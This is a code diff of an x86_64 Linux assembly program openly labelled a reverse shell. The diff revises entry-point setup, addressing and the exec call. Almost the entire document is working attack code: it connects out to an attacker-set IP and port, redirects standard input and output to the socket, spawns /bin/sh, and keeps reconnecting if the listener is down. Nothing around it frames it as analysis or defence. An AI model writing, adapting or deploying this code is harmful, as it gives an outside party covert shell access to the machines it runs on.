@@ -1,9 +1,6 @@
 ; ASSEMBLY REVERSE SHELL SCRIPT
 ; AUTHOR: MatrixTM26
 ; TARGET: LINUX x86_64 (ELF64 BIT)
-; compile:
-;     nasm -f elf64 shell.asm -o shell_asm_out.o
-;     gcc shell_asm_out.o -o shell_asm -no-pie -lc
 
 section .data
     ATTACKERIP db "127.0.0.1", 0
@@ -12,7 +9,7 @@ section .data
     shstr db "sh", 0
     msg_down db "[!] server seems down. reconnecting...", 10, 0
     msg_down_len equ $ - msg_down
-    msg_connected db "[+] connected to 127.0.0.1:25000", 10, 0
+    msg_connected db "[+] connected to server", 10, 0
     msg_conn_len equ $ - msg_connected
 
 section .bss
@@ -22,13 +19,13 @@ section .bss
     status resd 1
 
 section .text
-    global _start
+    global main
 
     extern socket
     extern connect
     extern close
     extern dup2
-    extern execl
+    extern execve
     extern fork
     extern waitpid
     extern write
@@ -36,7 +33,10 @@ section .text
     extern htons
     extern inet_addr
 
-_start:
+main:
+    push rbp
+    mov rbp, rsp
+
 .loop:
     mov edi, 2
     mov esi, 1
@@ -49,12 +49,12 @@ _start:
 
     mov word [addr], 2
 
-    movzx edi, word [ATTACKERPORT]
+    movzx edi, word [rel ATTACKERPORT]
     xor eax, eax
     call htons
     mov word [addr+2], ax
 
-    lea rdi, [ATTACKERIP]
+    lea rdi, [rel ATTACKERIP]
     xor eax, eax
     call inet_addr
     mov dword [addr+4], eax
@@ -70,7 +70,7 @@ _start:
     js .close_and_reconnect
 
     mov edi, 1
-    lea rsi, [msg_connected]
+    lea rsi, [rel msg_connected]
     mov edx, msg_conn_len - 1
     xor eax, eax
     call write
@@ -99,11 +99,16 @@ _start:
     xor eax, eax
     call dup2
 
-    lea rdi, [binsh]
-    lea rsi, [shstr]
+    xor rax, rax
+    push rax
+    lea rbx, [rel shstr]
+    push rbx
+
+    lea rdi, [rel binsh]
+    mov rsi, rsp
     xor rdx, rdx
     xor eax, eax
-    call execl
+    call execve
 
     mov eax, 60
     mov edi, 1
@@ -130,7 +135,7 @@ _start:
 .server_down:
 .reconnect_msg:
     mov edi, 1
-    lea rsi, [msg_down]
+    lea rsi, [rel msg_down]
     mov edx, msg_down_len - 1
     xor eax, eax
     call write
@@ -140,3 +145,7 @@ _start:
     call usleep
 
     jmp .loop
+
+    mov rsp, rbp
+    pop rbp
+    ret
